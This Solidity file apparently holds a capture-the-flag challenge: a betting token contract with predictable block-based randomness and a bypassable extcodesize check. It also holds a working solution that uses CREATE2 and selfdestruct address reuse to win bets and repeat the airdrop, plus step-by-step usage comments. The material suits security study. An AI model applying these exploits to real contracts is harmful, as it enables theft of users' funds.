// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _transferOwnership(_msgSender());
    }

    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

contract BetToken is Ownable {
    /* token related */
    mapping(address => uint256) public balances;

    /* random related */
    uint256 nonce;
    uint256 cost;
    uint256 lasttime;
    mapping(address => bool) public airdroprecord;
    mapping(address => uint256) public logger;

    constructor() Ownable() {
        balances[msg.sender] = 100000;
        nonce = 0;
        cost = 10;
        lasttime = block.timestamp;
    }

    function seal(address to, uint256 amount) public onlyOwner {
        balances[to] += amount;
    }

    function checkWin(address candidate) public onlyOwner {
        require(candidate != owner(), "you are cheating");
        require(balances[candidate] > 2000, "you still not win");
        balances[owner()] += balances[candidate];
        balances[candidate] = 0;
    }

    function transferTo(address to, uint256 amount) public pure {
        require(amount == 0, "this function is not impelmented yet");
    }

    function airdrop() public {
        require(
            airdroprecord[msg.sender] == false,
            "you already got your airdop"
        );
        airdroprecord[msg.sender] = true;
        balances[msg.sender] += 30;
    }

    function bet(uint256 value, uint256 mod) public {
        address _addr = msg.sender;
        // make sure pseudo-random is strong
        require(lasttime != block.timestamp);
        require(mod >= 2 && mod <= 12);
        require(logger[msg.sender] <= 20);
        logger[msg.sender] += 1;

        require(balances[msg.sender] >= cost);
        // watchout, the sender need to approve such first
        balances[msg.sender] -= cost;

        // limit
        value = value % mod;

        // not contract
        uint32 size;
        assembly {
            size := extcodesize(_addr)
        }
        require(size == 0);

        // rnd gen
        uint256 rand = uint256(
            keccak256(
                abi.encodePacked(
                    nonce,
                    block.timestamp,
                    block.difficulty,
                    msg.sender
                )
            )
        ) % mod;
        nonce += 1;
        lasttime = block.timestamp;

        // for one, max to win 12 * 12 - 10 == 134
        // if 20 times all right, will win 2680
        if (value == rand) {
            balances[msg.sender] += cost * mod;
        }
    }
}

contract HasState {
    uint public state;
    uint public nonce;
}

contract Callee {
    constructor(BetToken bt, HasState state) {
        if (state.state() == 0) {
            bt.airdrop();
        } else if (state.state() == 1) {
            uint256 rand = uint256(
                keccak256(
                    abi.encodePacked(
                        state.nonce(),
                        block.timestamp,
                        block.difficulty,
                        address(this)
                    )
                )
            ) % 12;
            bt.bet(rand, 12);
        }
    }
    function die() public {
        selfdestruct(payable(address(0)));
    }
}

contract Attacker is HasState {
    bytes32 salt;
    BetToken bt;
    address public pick;

    constructor(address addr) {
        state = 0;
        salt = keccak256(abi.encodePacked(address(this)));
        bt = BetToken(addr);
        nonce = 0;
    }
    function doAirDrop() public {
        require(state == 0, "Air droped");
        Callee cc = new Callee{salt:salt}(bt, HasState(this));
        pick = address(cc);
        cc.die();
    }
    function setNonce(uint nn) public {
        nonce = nn;
    }
    function doNextTick() public {
        state = 1;
        Callee cc = new Callee{salt:salt}(bt, HasState(this));
        pick = address(pick);
        cc.die();
        nonce++;
    }
}

// Usage:
// 1. Depoly Attacker(BetTokenAddr)
// 2. Run doAirDrop()
// 3. Let setNonce(nonce) # the nonce is get by eth.getStorageAt
// 4. Run doNextTick() for many times (each run should sleep until next block)
// 5. get address from pick(), submit it
